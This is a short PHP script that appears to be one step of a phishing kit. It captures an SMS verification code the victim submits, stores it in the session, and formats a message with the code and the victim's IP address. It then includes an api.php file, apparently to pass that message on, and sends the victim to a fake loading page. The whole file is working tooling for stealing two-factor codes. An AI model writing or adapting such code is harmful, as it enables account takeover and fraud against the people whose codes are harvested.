<?php

session_start();


$smserror = $_SESSION['smserror'] = $_POST['smserror'];

$hexor = '
# SMS Code 2 📱
# Code : '.$_SESSION["smserror"].' 
# IP : '.$_SERVER['REMOTE_ADDR'].' 
';







include("api.php"); 



header('Location: ../loading3.php');


?>


